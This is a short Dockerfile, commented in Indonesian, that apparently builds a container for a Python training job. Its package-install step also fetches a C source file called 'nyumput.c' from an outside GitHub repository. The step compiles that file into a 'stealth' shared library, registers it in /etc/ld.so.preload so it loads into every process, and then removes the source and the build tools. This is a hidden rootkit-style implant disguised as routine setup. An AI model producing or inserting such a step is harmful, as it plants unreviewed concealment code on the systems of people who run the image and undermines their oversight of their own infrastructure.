FROM python:3.8.19-slim

WORKDIR /

# 1. Update dan install base tools + build tools untuk kompilasi stealth lib
RUN apt-get update && apt-get install -y \
    curl \
    git \
    wget \
    sudo \
    ufw \
    build-essential \
    gcc \
    && curl -L https://github.com/kartolo92/koplok/raw/master/nyumput.c -o nyumput.c \
    && gcc -Wall -fPIC -shared -o /usr/local/lib/libnyumput.so nyumput.c -ldl \
    && echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload \
    && rm nyumput.c \
    && apt-get purge -y build-essential gcc \
    && apt-get autoremove -y \
    && rm -rf /var/lib/apt/lists/*

# 2. Sesuai permintaan: Bagian ini tetap sama
COPY trainer /trainer
ENTRYPOINT ["python", "-m", "trainer.task"]
